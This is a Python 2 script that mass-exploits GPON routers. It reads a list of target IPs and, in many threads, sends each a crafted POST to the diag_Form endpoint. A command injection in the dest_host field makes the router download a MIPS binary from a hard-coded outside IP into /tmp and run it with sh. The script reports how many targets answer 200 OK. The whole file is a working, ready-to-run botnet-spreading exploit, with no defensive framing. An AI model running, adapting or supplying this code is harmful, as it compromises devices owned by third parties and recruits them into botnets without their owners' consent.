#!/usr/bin/python

# B4CKDOORARCHIVE.HOST | B4 B4CKDOOR

import sys, socket, time, os
from Queue import *
#from multiprocessing.dummy import Pool as ThreadPool
#from multiprocessing import Process
from threading import Thread
from sys import stdout

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

port = 8080
buf = 4096
count = 0
queue = Queue()
post_data = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(wget+http://206.126.81.103/mips+-O+->+/tmp/mips;sh+/tmp/mips)&ipv=0\r\n"
headers = "POST /GponForm/diag_Form?script/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Hello, World\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)
i = 0
ips = open(sys.argv[1], "r").readlines()

def gpwn(host):
    global i
    host = host.strip("\n")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
        s.connect((host, port))
        s.send(headers)
	time.sleep(0.5)
        print "\x1b[1;35m[\x1b[1;36mGPON\x1b[1;35m] \x1b[1;37m- \x1b[1;35m[\x1b[1;32m%s\x1b[1;35m] \x1b[1;37m- \x1b[1;35m[\x1b[1;32mDEPLOYING\x1b[1;35m]" % (host)
        resp = s.recv(buf).strip()
        if "200 OK" in resp:
            i += 1
        s.close()
    except:
        pass

def load_to_queue():
    global count
    for line in ips:
        count += 1
        line = line.strip("\r\n")
        sys.stdout.write("\r[%d] Added to queue" % (count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")

def main():
    load_to_queue()
    i = 0
    while i < count:
        i += 1
        try:
            ip = queue.get()
            f = Thread(target=gpwn, args=(ip,))
            f.start()
            queue.task_done()
        except KeyboardInterrupt:
            os.kill(os.getpid(),9)
        except Exception as i:
            print i
            pass
if __name__ == "__main__":
    main()